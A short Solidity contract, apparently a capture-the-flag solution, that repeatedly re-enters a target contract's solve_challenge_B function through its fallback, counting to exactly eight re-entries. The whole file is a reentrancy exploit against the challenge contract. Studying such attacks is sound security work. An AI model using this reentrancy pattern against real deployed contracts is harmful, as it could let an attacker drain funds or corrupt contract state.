// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract reenter_x {
    constructor(address targ) {
        _targ = targ;
    }

    uint16 bellCounter;
    address _targ;

    function __initiate() public {
        target(_targ).solve_challenge_B();
    }

    fallback() external {
        //we need to reenter targ 8 times precisely
        if (bellCounter == 8) {
            return;
        }
        bellCounter++;
        target(_targ).solve_challenge_B();
    }
}

interface target {
    function solve_challenge_B() external;
}
